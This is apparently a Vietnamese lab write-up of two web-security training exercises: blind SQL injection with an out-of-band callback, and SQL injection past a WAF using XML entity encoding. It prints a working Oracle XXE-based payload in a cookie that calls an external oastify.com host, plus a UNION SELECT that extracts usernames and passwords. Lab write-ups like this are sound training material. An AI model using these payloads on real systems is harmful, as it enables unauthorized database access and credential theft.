### Lab: Blind SQL injection with out-of-band interaction

- Thử payload check SQLi `''` thì thấy trả về `400 Bad Request`

    ![alt text](/SQLi/images/image-9.png)

- Thấy ở phần `Cookie` có cái `TrackingId=vwtTtOUj0OLYzIO7` khá lạ nên thử inject vào đó 

    ![alt text](/SQLi/images/image-10.png)

- Thử với các payload `OOB` thì có cái này hợp lệ

    ![alt text](/SQLi/images/image-11.png)

    - Payload: `TrackingId=vwtTtOUj0OLYzIO7'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//cr7wloypge7785bttf6naqslnct3hv5k.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--`

    ![alt text](/SQLi/images/image-13.png)


    - Vào `Burp Collaborator` pull là xong

    ![alt text](/SQLi/images/image-12.png)

    - Done

    ![alt text](/SQLi/images/image-14.png)

### Lab: SQL injection with filter bypass via XML encoding

- Trang web của bài

    ![alt text](/SQLi/images/image.png)

- Thử với tính năng `Check stock`

    ![alt text](/SQLi/images/image-1.png)

- Burp Repeater
    ![alt text](/SQLi/images/image-2.png)

- Thử với 1 request XML hợp lệ

    ![alt text](/SQLi/images/image-3.png)

    - Giờ thử với `UNION SELECT`, thấy bị detected bởi waf

    ![alt text](/SQLi/images/image-4.png)

    - Thử lại khi dùng thẻ `<@dec_entities>`, thấy kết quả hiện thị `null` tức là thành công null payload

    ![alt text](/SQLi/images/image-5.png)

    - Thử select username và password với `1 UNION SELECT username || '~' || password FROM users`, thành công lấy được tài khoản `administrator`

    ![alt text](/SQLi/images/image-6.png)

- Login vào tài khoản admin là solve lab

    ![alt text](/SQLi/images/image-7.png)
